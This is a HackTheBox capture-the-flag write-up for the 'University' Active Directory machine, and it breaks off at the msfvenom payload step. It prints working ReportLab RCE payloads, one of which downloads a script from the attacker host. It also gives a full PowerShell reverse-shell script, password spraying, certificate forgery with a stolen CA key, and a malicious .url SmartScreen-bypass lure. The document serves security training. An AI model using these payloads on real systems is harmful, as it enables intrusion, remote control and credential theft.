---
title: "University"
date: 2025-08-09 00:00:00 +0500
categories: [HackTheBox, Windows]
tags: [CVE-2023-33733, Unconstrained-Delegation, CVE-2023-36025, RBCD, GMSA]
description: Writeup for HackTheBox University machine
image:
  path: assets/img/university/university.png
  alt: HTB University
---

## 1. Executive Summary

University is an Insane-difficulty Windows Active Directory machine that demonstrates a sophisticated attack chain involving web application exploitation, certificate abuse, and Kerberos delegation misconfigurations. The attack path progresses from a ReportLab RCE vulnerability, through certificate theft and a phishing-style lecture upload, to an NTLM relay against Windows delegation, and finally to domain admin via a Group Managed Service Account (GMSA) that is itself misconfigured with Resource-Based Constrained Delegation (RBCD) rights over the Domain Controller.

### The Attack Chain:

1. **ReportLab RCE (CVE-2023-33733):** The website uses `xhtml2pdf` to generate PDFs from HTML content. A malicious payload injected into the profile bio triggers Remote Code Execution when a PDF export is requested.
2. **Initial Access as WAO:** Initial foothold on the Domain Controller (`DC.university.htb`) as `university\wao`.
3. **Password Discovery:** Plaintext password `WebAO1337` is discovered inside `db-backup-automator.ps1` and turns out to be WAO's Active Directory password, reusable for SMB and WinRM.
4. **Delegation Reconnaissance:** `Get-ADComputer` reveals that workstation `WS-3` is trusted for unconstrained delegation (`TrustedForDelegation: True`), marking it as a future ticket-harvesting target.
5. **Certificate Forging:** The unprotected Root CA private key (`rootCA.key`) and certificate (`rootCA.crt`) are discovered in the web root directory (`C:\Web\University\CA`), allowing certificate forgery for user `nya` (Professor), granting course-management privileges on the web application.
6. **Malicious Lecture Upload (CVE-2023-36025):** A GPG-signed ZIP containing a malicious `.url` file pointing to a local executable is uploaded as a course lecture, exploiting a Windows SmartScreen bypass (CVE-2023-36025) to achieve code execution as `martin.t` once the file is opened on the review workstation `WS-3`.
7. **RBCD Relay Attack:** `mitm6` poisons IPv6/WPAD name resolution and `ntlmrelayx` relays `WS-3$`'s machine authentication to LDAP, granting a fake computer account (`hyena$`) Resource-Based Constrained Delegation (RBCD) rights over `WS-3`.
8. **Administrator on WS-3:** `impacket-getST` abuses that RBCD trust via S4U2Proxy to request a service ticket impersonating Administrator on `WS-3`.
9. **Ticket Harvesting (Unconstrained Delegation Abuse):** Because `WS-3` is trusted for unconstrained delegation, `Rubeus monitor` dumps every TGT cached in its LSASS memory, including `Rose.L`'s ticket.
10. **GMSA Password Abuse:** `Rose.L`'s ticket is used to authenticate to the Domain Controller, where BloodHound reveals `Rose.L` -> `Help Desk` -> `Account Operators` -> `ReadGMSAPassword` on `GMSA-PClient01$`. `netexec --gmsa` dumps `GMSA-PClient01$`'s NTLM hash (`de6942ca053425efd2e0b2cf1d6f7e74`).
11. **RBCD on the GMSA over the DC:** `GMSA-PClient01$` is itself configured with `msDS-AllowedToActOnBehalfOfOtherIdentity` (RBCD) over the Domain Controller's computer object (`DC.university.htb`). Its retrieved NTLM hash is used with `impacket-getST` to request a Kerberos service ticket impersonating Administrator directly against the DC.
12. **Root Flag:** The resulting Administrator service ticket is used with `impacket-psexec` to obtain a SYSTEM shell on `DC.university.htb` and retrieve the root flag.

---

## 2. Reconnaissance

### 2.1 Full TCP Port Scan

Initial reconnaissance begins with a comprehensive, two-phase Nmap scan. In the first phase, a high-speed TCP SYN scan (`-sS`) is initiated across all 65,535 ports with host discovery disabled (`-Pn`) and a minimum packet rate of 5,000 packets per second (`--min-rate 5000`). Disabling host discovery ensures that firewall rules blocking ICMP ping probes do not cause Nmap to falsely report the target as offline before any TCP ports are probed.

Execute the full port scan against the target IP address `10.129.231.193`:

```bash
kali@kali$ nmap -sS -Pn -min-rate 5000 --max-retries 1 -T4 -p- 10.129.231.193
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-28 04:42 +0000
Warning: 10.129.231.193 giving up on port because retransmission cap hit (1).
Nmap scan report for 10.129.231.193
Host is up (0.35s latency).
Not shown: 65509 closed tcp ports (reset)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
2179/tcp  open  vmrdp
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49668/tcp open  unknown
49671/tcp open  unknown
49676/tcp open  unknown
49677/tcp open  unknown
49679/tcp open  unknown
49685/tcp open  unknown
49706/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 15.07 seconds
```

The scan returns a broad array of open ports immediately indicative of an Active Directory Domain Controller: DNS (53), Kerberos (88), RPC Endpoint Mapper (135), NetBIOS (139), LDAP (389), SMB (445), KPASSWD (464), LDAPS (636), Global Catalog (3268/3269), WinRM (5985), and Active Directory Web Services (9389). Port 80 is also open, indicating an active HTTP web server.

### 2.2 Service & Version Detection

With the list of active ports established, the second phase of Nmap reconnaissance performs service version detection (`-sV`) and runs standard Nmap Scripting Engine scripts (`-sC`) specifically targeted at the open port set. This targeted approach gathers maximum detail regarding software versions, Active Directory domain names, and security settings without wasting time scanning closed ports.

Execute targeted service enumeration against the discovered open ports:

```bash
kali@kali$ nmap -sV -sC -p 53,80,88,135,139,389,445,464,593,636,2179,3268,3269,5985,9389,47001 -O -A 10.129.231.193
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-28 04:45 +0000
Stats: 0:00:10 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 75.00% done; ETC: 04:45 (0:00:03 remaining)
Stats: 0:00:10 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 75.00% done; ETC: 04:45 (0:00:03 remaining)
Stats: 0:00:11 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 75.00% done; ETC: 04:45 (0:00:03 remaining)
Nmap scan report for university.htb (10.129.231.193)
Host is up (0.35s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          nginx 1.24.0
|_http-title: University
|_http-server-header: nginx/1.24.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-28 11:51:23Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: university.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
2179/tcp  open  vmrdp?
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: university.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10|11|2012|2022|2016 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2019 (97%), Microsoft Windows 10 1909 - 2004 (96%), Microsoft Windows 10 1709 - 22H2 (94%), Microsoft Windows 10 1909 (92%), Microsoft Windows 11 24H2 - 25H2 (92%), Microsoft Windows Server 2012 R2 (92%), Microsoft Windows Server 2022 (92%), Microsoft Windows Server 2016 (90%), Microsoft Windows 10 21H2 (90%), Microsoft Windows 10 1703 or Windows 11 21H2 - 23H2 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
|_clock-skew: 7h05m50s
| smb2-time:
|   date: 2026-07-28T11:52:09
|_  start_date: N/A

TRACEROUTE (using port 445/tcp)
HOP RTT       ADDRESS
1   426.70 ms 10.10.14.1
2   426.95 ms university.htb (10.129.231.193)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 90.84 seconds
```

**Key Technical Discoveries:**
- Domain Name: `university.htb`
- Domain Controller Hostname: `DC.university.htb`
- Operating System: Windows Server 2019 / 2022
- Web Server: Nginx 1.24.0 serving a Django web application
- SMB Security: Message signing is enabled and required, preventing direct NTLM relay attacks against SMB on the DC
- Clock Skew: The Domain Controller's system clock is skewed by approximately +7 hours relative to the local testing system. Because Kerberos authentication relies on tight timestamp synchronization (typically within 5 minutes), any Kerberos operations will require syncing or adjusting local client time to prevent `KRB_AP_ERR_SKEW` authentication failures.

### 2.3 DNS Resolution

Active Directory domain services, LDAP queries, and Kerberos authentication require proper hostname resolution. `netexec` is run against the SMB service to verify domain connectivity and automatically generate the necessary entry for `/etc/hosts`:

```bash
kali@kali$ netexec smb 10.129.231.193 --generate-hosts hosts
SMB         10.129.231.193  445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:university.htb) (signing:True) (SMBv1:False)
kali@kali$ cat hosts
10.129.231.193  DC.university.htb university.htb DC
kali@kali$ cat hosts /etc/hosts | sponge /etc/hosts
```

The DNS entry `10.129.231.193 university.htb DC.university.htb` is appended to `/etc/hosts`, ensuring all domain tools can resolve hostnames natively.

### 2.4 Web Application Enumeration

With host resolution configured, web application enumeration begins by sending an HTTP HEAD request via `curl` to examine server response headers and confirm the web framework.

Execute an HTTP header inspection request against `http://university.htb/`:

```bash
kali@kali$ curl -I http://university.htb/
HTTP/1.1 200 OK
Server: nginx/1.24.0
Date: Tue, 28 Jul 2026 12:00:47 GMT
Content-Type: text/html; charset=utf-8
Connection: keep-alive
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Referrer-Policy: same-origin
Cross-Origin-Opener-Policy: same-origin
```

The response confirms an Nginx 1.24.0 reverse proxy forwarding requests to a Python Django backend. Navigating to `http://university.htb/` in the browser loads the primary portal for the university.

<img src="assets/img/university/Defalut_page.png">

The screenshot above illustrates the default landing page of the University portal. The site provides student self-registration, professor portal access, course catalog browsing, and an option for certificate-based authentication ("Request Signed-Cert").

Further investigation of the student portal reveals that registered students can view enrolled courses and export their profile details to a PDF file. The application notes that submitted content and lecture materials undergo manual review by a "Content Evaluation" team, hinting at automated or user-driven interaction on an internal workstation.

### 2.5 PDF Metadata Analysis

To analyze how the application handles document generation, a student account is created, and custom text is entered into the profile Bio field.

<img src="assets/img/university/User_bio_area.png">

The image above shows the profile editing form where custom Bio text is supplied. After saving the profile, the user clicks the export button to generate a PDF document.

The generated PDF is downloaded and inspected using `exiftool` to extract file metadata and determine the PDF rendering engine:

```bash
kali@kali$ exiftool profile.pdf
ExifTool Version Number         : 13.55
File Name                       : profile.pdf
Directory                       : .
File Size                       : 7.6 kB
File Modification Date/Time     : 2026:07:28 05:01:12+00:00
File Access Date/Time           : 2026:07:28 05:01:26+00:00
File Inode Change Date/Time     : 2026:07:28 05:01:26+00:00
File Permissions                : -rw-rw-r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Author                          :
Create Date                     : 2026:07:28 05:07:00+08:00
Creator                         : (unspecified)
Modify Date                     : 2026:07:28 05:07:00+08:00
Producer                        : xhtml2pdf <https://github.com/xhtml2pdf/xhtml2pdf/>
Subject                         :
Title                           : University | raven Profile
Trapped                         : False
Page Mode                       : UseNone
Page Count                      : 1
```

**Critical Analysis:** The Creator metadata field explicitly identifies the rendering library as `xhtml2pdf` (v0.2.11). `xhtml2pdf` is a Python library that converts HTML/CSS input into PDF documents by leveraging ReportLab as its underlying rendering core. Outdated versions of ReportLab contain a severe Remote Code Execution vulnerability (CVE-2023-33733) caused by unsafe string evaluation during HTML color parsing.

---

## 3. Initial Foothold: ReportLab RCE (CVE-2023-33733)

### 3.1 Understanding the Vulnerability

ReportLab versions prior to 3.6.13 fail to properly sanitize HTML `<font>` color attributes. When parsing `<font color="...">`, the library passes the attribute value directly into Python's `eval()` function. An attacker can construct a payload that abuses attribute lookup overloads on built-in objects to escape the sandbox, access `__globals__`, and invoke `os.system()`.

The ReportLab RCE payload structure:

```html
<para><font color="[[[getattr(pow, Word('__globals__'))['os'].system('COMMAND_HERE') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">
    exploit
</font></para>
```

### 3.2 Testing with Ping

Before attempting to execute a complex reverse shell payload, a simple ICMP ping payload is injected to verify out-of-band execution. A `tcpdump` listener is started on Kali's `tun0` interface to capture incoming ICMP echo requests.

Start the packet capture listener on Kali:

```html
<para><font color="[[[getattr(pow, Word('__globals__'))['os'].system('ping -n 5 10.10.14.5') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">
    exploit
</font></para>
```

The ping payload is inserted into the profile Bio field on the web application.

<img src="assets/img/university/Submiting_paylad_inBio_section.png">

The image above demonstrates inserting the ReportLab RCE payload into the Bio text field before saving the profile and requesting a PDF export.

When the PDF export is processed by `xhtml2pdf`, the backend executes the embedded payload. The `tcpdump` window captures four ICMP echo requests originating from the target:

```bash
kali@kali$ sudo tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
20:24:48.066620 IP 10.129.231.193 > 10.10.14.5: ICMP echo request, id 1, seq 1, length 40
20:24:48.066666 IP 10.10.14.5 > 10.129.231.193: ICMP echo reply, id 1, seq 1, length 40
20:24:49.076732 IP 10.129.231.193 > 10.10.14.5: ICMP echo request, id 1, seq 2, length 40
20:24:49.076766 IP 10.10.14.5 > 10.129.231.193: ICMP echo reply, id 1, seq 2, length 40
20:24:50.097978 IP 10.129.231.193 > 10.10.14.5: ICMP echo request, id 1, seq 3, length 40
20:24:50.097995 IP 10.10.14.5 > 10.129.231.193: ICMP echo reply, id 1, seq 3, length 40
20:24:51.117805 IP 10.129.231.193 > 10.10.14.5: ICMP echo request, id 1, seq 4, length 40
20:24:51.117824 IP 10.10.14.5 > 10.129.231.193: ICMP echo reply, id 1, seq 4, length 40
```

Receiving exactly four ICMP packets confirms both remote code execution and that the backend operating system is Windows (which sends four pings by default).

### 3.3 Getting a Reverse Shell

To achieve a stable interactive foothold, a PowerShell reverse shell script (`shell.ps1`) is written on Kali and served over HTTP using Python's built-in `http.server` module.

Create `shell.ps1` on the local attacker system:

```bash
kali@kali$ cat > shell.ps1 << 'EOF'
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.5',4444);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()
EOF
```

Because embedding a full reverse shell directly inside the ReportLab HTML attribute introduces syntax escaping conflicts, execution is split into two clean steps. First, an RCE payload executes `wget` to download `shell.ps1` from Kali and save it to `C:\Windows\Tasks\shell.ps1`.

Trigger the script download payload via PDF export:

```html
<para><font color="[[[getattr(pow, Word('__globals__'))['os'].system('powershell -c iwr http://10.10.14.5:8080/shell.ps1 -o shell.ps1') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">
    exploit
</font></para>
```

Next, a second payload is submitted to execute the downloaded PowerShell script using `powershell -ExecutionPolicy Bypass -File C:\Windows\Tasks\shell.ps1`.

Trigger script execution via PDF export:

```html
<para><font color="[[[getattr(pow, Word('__globals__'))['os'].system('powershell ./shell.ps1') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">
    exploit
</font></para>
```

A `netcat` listener configured with `rlwrap` on port 4444 captures the incoming connection:

```bash
kali@kali$ rlwrap -cAr nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.231.193 53894
Windows PowerShell running as user WAO on DC
PS C:\Web\University> whoami
university\wao
```

<img src="assets/img/university/Got_initial_university_shell.png">

The screenshot above confirms the interactive PowerShell session established on Kali, operating as user `university\wao` on `DC.university.htb`.

---

## 4. Shell as WAO on DC

### 4.1 Initial Enumeration

With a foothold established on the Domain Controller as `university\wao`, initial host enumeration is conducted using standard PowerShell environment commands.

Execute `whoami` and inspect network adapters using `ipconfig`:

```powershell
PS C:\Web\University> whoami
university\wao
PS C:\Web\University> hostname
DC
PS C:\Web\University> ipconfig

Windows IP Configuration

Ethernet adapter Ethernet0:
   IPv4 Address. . . . . . . . . . . : 10.129.231.193
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.129.231.1

Ethernet adapter vEthernet (Internal-VSwitch1):

   IPv4 Address. . . . . . . . . . . : 192.168.99.1
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . :
```

**Key Findings:**
- User Context: `university\wao`
- Primary Adapter: `10.129.231.193` (External HTB network)
- Secondary Adapter: `192.168.99.1` (Internal private subnet `192.168.99.0/24`)

The presence of `192.168.99.1` confirms that `DC.university.htb` is dual-homed, acting as a bridge between the external network and an internal private lab network.

### 4.2 Discovering the Backup Script

FileSystem enumeration of `C:\Web` reveals a backup directory containing a PowerShell maintenance script:

```powershell
PS C:\Web\DB Backups> cat db-backup-automator.ps1
$sourcePath = "C:\Web\University\db.sqlite3"
$destinationPath = "C:\Web\DB Backups\"
$7zExePath = "C:\Program Files\7-Zip\7z.exe"

$zipFileName = "DB-Backup-$(Get-Date -Format 'yyyy-MM-dd').zip"
$zipFilePath = Join-Path -Path $destinationPath -ChildPath $zipFileName
$7zCommand = "& `"$7zExePath`" a `"$zipFilePath`" `"$sourcePath`" -p'WebAO1337'"
Invoke-Expression -Command $7zCommand
```

**Critical Discovery:** The script contains hardcoded credentials: `$password = "WebAO1337"`.

### 4.3 Password Spray

To determine if `WebAO1337` is reused as an Active Directory password, `netexec` is used to spray the credential against the domain users list over SMB.

Execute the SMB password spray:

```bash
kali@kali$ netexec smb dc.university.htb -u users.txt -p WebAO1337 --continue-on-success
SMB         10.129.231.193   445    DC               [+] university.htb\WAO:WebAO1337
```

The spray confirms that `WebAO1337` is the valid Active Directory password for user `WAO`.

Verify WinRM remote management access using the confirmed credentials:

```bash
kali@kali$ netexec winrm dc.university.htb -u WAO -p WebAO1337
WINRM       10.129.231.193   5985   DC               [+] university.htb\WAO:WebAO1337 (Pwn3d!)
```

The `Pwn3d!` status confirms that WinRM access is enabled for `WAO`, allowing direct administrative remote management.

Establish a stable Evil-WinRM session to `DC.university.htb`:

```bash
kali@kali$ evil-winrm -i dc.university.htb -u WAO -p 'WebAO1337'
```

### 4.4 Domain Enumeration

Using the `ActiveDirectory` PowerShell module within Evil-WinRM, domain controllers, computers, and delegation configurations are enumerated.

Query domain controller objects:

```powershell
PS C:\Web\University> Import-Module ActiveDirectory; Get-ADComputer -Filter * -Property DNSHostName | Select-Object Name,DNSHostName,IPAddress

Name         DNSHostName                 IPAddress
----         -----------                 ---------
DC           DC.university.htb           {}
WS-3         WS-3.university.htb         {}
WS-1                                     {}
WS-2                                     {}
WS-4                                     {}
WS-5                                     {}
LAB-2        LAB-2                       {}
SETUPMACHINE SetupMachine.university.htb {}
```

Query all computer objects registered in the Active Directory domain:

```powershell
PS C:\Web\University> Get-ADComputer -Filter * -Property DNSHostName | ForEach-Object {
    $computer = $_
    try {
        $ip = [System.Net.Dns]::GetHostAddresses($computer.DNSHostName) | Where-Object {$_.AddressFamily -eq 'InterNetwork'} | Select-Object -First 1
        [PSCustomObject]@{
            Name = $computer.Name
            DNSHostName = $computer.DNSHostName
            IPAddress = $ip.IPAddressToString
        }
    } catch {
        [PSCustomObject]@{
            Name = $computer.Name
            DNSHostName = $computer.DNSHostName
            IPAddress = "N/A"
        }
    }
}

Name         DNSHostName                 IPAddress
----         -----------                 ---------
DC           DC.university.htb           10.129.231.193
WS-3         WS-3.university.htb         192.168.99.2
WS-1                                     10.129.231.193
WS-2                                     10.129.231.193
WS-4                                     10.129.231.193
WS-5                                     10.129.231.193
LAB-2        LAB-2                       192.168.99.12
SETUPMACHINE SetupMachine.university.htb 10.10.10.4
```

The domain inventory identifies internal targets on the `192.168.99.0/24` subnet: `WS-3` (`192.168.99.2`) and `LAB-2` (`192.168.99.12`).

Inspect Active Directory delegation properties for computer object `WS-3`:

```powershell
PS C:\Web\University> Get-ADComputer -Identity WS-3 -Properties TrustedForDelegation,servicePrincipalName

DistinguishedName    : CN=WS-3,CN=Computers,DC=university,DC=htb
DNSHostName          : WS-3.university.htb
Enabled              : True
Name                 : WS-3
ObjectClass          : computer
SamAccountName       : WS-3$
servicePrincipalName : {TERMSRV/WS-3, TERMSRV/WS-3.university.htb, WSMAN/WS-3, WSMAN/WS-3.university.htb...}
TrustedForDelegation : True
```

**Critical Analysis:** `WS-3` has `TrustedForDelegation: True`, confirming that **Unconstrained Delegation** is enabled on `WS-3`. When any domain user or administrator authenticates to `WS-3`, a copy of their Kerberos Ticket Granting Ticket (TGT) is cached in `WS-3`'s LSASS memory. If local administrator privileges can be gained on `WS-3`, those cached tickets can be extracted.

### 4.5 SMB Enumeration

Enumerate SMB network shares accessible with `WAO`'s credentials:

```bash
kali@kali$ netexec smb dc.university.htb -u WAO -p WebAO1337 --shares
SMB         10.129.231.193   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:university.htb) (signing:True) (SMBv1:False)
SMB         10.129.231.193   445    DC               [+] university.htb\WAO:WebAO1337
SMB         10.129.231.193   445    DC               [*] Enumerated shares
SMB         10.129.231.193   445    DC               Share           Permissions     Remark
SMB         10.129.231.193   445    DC               -----           -----------     ------
SMB         10.129.231.193   445    DC               ADMIN$                          Remote Admin
SMB         10.129.231.193   445    DC               C$                              Default share
SMB         10.129.231.193   445    DC               IPC$            READ            Remote IPC
SMB         10.129.231.193   445    DC               Lectures                        Lectures Share folder for Content Evalutors for reviewing submitted lectures
SMB         10.129.231.193   445    DC               NETLOGON        READ            Logon server share
SMB         10.129.231.193   445    DC               SYSVOL          READ            Logon server share
```

The `Lectures` share is readable, serving as a staging location for course files evaluated by internal staff.

### 4.6 Root CA Files

Enumeration of the web application directory `C:\Web\University\CA` discloses the Certificate Authority material used by the web portal:

```powershell
PS C:\Web\University> ls CA

Directory: C:\Web\University\CA

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/15/2024   5:51 AM           1399 rootCA.crt
-a----        2/15/2024   5:48 AM           1704 rootCA.key
-a----        2/25/2024   5:41 PM             42 rootCA.srl
```

Both `rootCA.crt` (the Root Certificate) and `rootCA.key` (the private key) are stored with permissive NTFS permissions, allowing standard users to read them. Access to `rootCA.key` enables forging valid client certificates for any user account on the web platform.

---

## 5. Lateral Movement: Pivoting with Chisel

### 5.1 Setting Up Chisel

Because internal hosts on `192.168.99.0/24` cannot be reached directly from Kali, Chisel is deployed to create a SOCKS5 reverse tunnel through `DC.university.htb`.

Start the Chisel server listener on Kali:

```bash
# On the attacker host
kali@kali$ ./chisel server -p 8000 --reverse --socks5
```

Execute the Chisel client on `DC` via Evil-WinRM to connect back to Kali and establish the reverse proxy:

```powershell
# On DC (Evil-WinRM)
PS C:\Users\WAO\Downloads> .\chisel.exe client 10.10.14.5:8000 R:socks
```

### 5.2 Evil-WinRM as WAO

With the SOCKS5 proxy active on port 1080, `proxychains4` is configured to route traffic through the Chisel tunnel.

Test WinRM proxy connectivity to `DC.university.htb`:

```bash
kali@kali$ evil-winrm -i 10.129.231.193 -u wao -p 'WebAO1337'
```

### 5.3 Connecting to WS-3

Use `proxychains4` and Evil-WinRM to connect directly to internal workstation `WS-3` (`192.168.99.2`) using `WAO`'s credentials:

```bash
kali@kali$ proxychains4 evil-winrm -i 192.168.99.2 -u wao -p 'WebAO1337'
*Evil-WinRM* PS C:\Users\wao\Documents> whoami
university\wao
```

Successful connection confirms WinRM access to `WS-3` over the internal network bridge.

### 5.4 Connecting to LAB-2

Next, `proxychains4` is used to establish an SSH connection to Linux host `LAB-2` (`192.168.99.12`) as user `wao`:

```bash
kali@kali$ proxychains4 ssh wao@192.168.99.12
wao@LAB-2:~$ whoami
wao
```

Check `sudo` privileges on `LAB-2`:

```bash
wao@LAB-2:~$ sudo -l
User wao may run the following commands on LAB-2:
    (ALL : ALL) ALL
wao@LAB-2:~$ sudo -i
root@LAB-2:~# whoami
root
```

User `wao` has passwordless `(ALL : ALL) ALL` sudo rights on `LAB-2`. `LAB-2` will serve as the internal attacker platform for running network poisoning tools (`mitm6` and `ntlmrelayx`) against `WS-3`.

---

## 6. Professor Access via Certificate Forging

### 6.1 Identifying Professor Accounts

To access course management features on the web portal, the Django database (`C:\Web\University\db.sqlite3`) is queried for accounts holding the `Professor` role:

```sql
sqlite> select username,email,user_type from University_customuser where user_type='Professor';
username|email|user_type
george|george@university.htb|Professor
carol|carol@science.com|Professor
Nour|nour.qasso@gmail.com|Professor
martin.rose|martin.rose@hotmail.com|Professor
nya|nya.laracrof@skype.com|Professor
```

The query returns professor user `nya` (`nya.laracrof@skype.com`).

### 6.2 Forging Nya's Certificate

Using the stolen `rootCA.key` and `rootCA.crt`, `openssl` generates a forged X.509 client certificate for `nya.laracrof@skype.com`:

```bash
kali@kali$ openssl req -newkey rsa:2048 -keyout nya.key -out nya.csr -nodes -subj "/CN=nya/emailAddress=nya.laracrof@skype.com"
kali@kali$ openssl x509 -req -in nya.csr -CA rootCA.crt -CAkey rootCA.key -CAcreateserial -out nya.crt -days 365
kali@kali$ openssl pkcs12 -export -out nya.pfx -inkey nya.key -in nya.crt -password pass:nya123
```

The resulting PKCS#12 bundle `nya.pfx` is imported into the browser to authenticate as Professor Nya.

<img src="assets/img/university/Succesfullt_login_as_naya.png">

The screenshot above shows successful certificate-based authentication as Professor Nya.

<img src="assets/img/university/naya_professor_detail.png">

The image above confirms Professor Nya's dashboard, displaying administrative options to create courses and upload lecture archives.

### 6.3 Uploading Nya's GPG Public Key

Lecture submissions must be digitally signed with a GPG key matching the professor's profile. A new GPG keypair for `nya.laracrof@skype.com` is generated on Kali:

```bash
kali@kali$ gpg --batch --gen-key <<EOF
%no-protection
Key-Type: RSA
Key-Length: 2048
Name-Real: Nya Laracrof
Name-Email: nya.laracrof@skype.com
%commit
EOF
kali@kali$ gpg --armor --export nya.laracrof@skype.com > nya-pubkey.asc
```

The public key `nya-pubkey.asc` is uploaded to Nya's profile on the web application to authorize signed uploads.

### 6.4 Creating a Malicious Lecture (CVE-2023-36025)

Windows SmartScreen contains a security bypass vulnerability (CVE-2023-36025) involving `.url` internet shortcuts. When a user opens a `.url` file pointing to a local or UNC executable, SmartScreen fails to display security warnings.

Create a malicious shortcut `click_me.url` pointing to `file://C:/Programdata/amra.exe`:

```bash
kali@kali$ cat > click_me.url << 'EOF'
[InternetShortcut]
URL=file://C:/Programdata/amra.exe
IDList=
EOF

kali@kali$ cat > Reference-1.url << 'EOF'
[InternetShortcut]
URL=http://site1.reference.com
IDList=
EOF

kali@kali$ cat > Reference-2.url << 'EOF'
[InternetShortcut]
URL=http://site2.reference.com/reference
IDList=
EOF

kali@kali$ zip lecture0xdf.zip Reference-1.url Reference-2.url click_me.url
kali@kali$ gpg -u nya.laracrof@skype.com --detach-sign lecture0xdf.zip
```

The shortcut is packaged into `lecture0xdf.zip` and signed with Nya's GPG key, generating `lecture0xdf.zip.sig`.

<img src="assets/img/university/Upload_form.png">

The screenshot above shows the lecture submission interface where `lecture0xdf.zip` and its signature are uploaded for content evaluation.

---

## 7. Shell as Martin.T on WS-3

### 7.1 Preparing the Payload

An `msfvenom` reverse shell executable `amra.exe` is compiled to connect back to internal pivot host `LAB-2` (`192.168.99.12`) on port 9001:

```bash
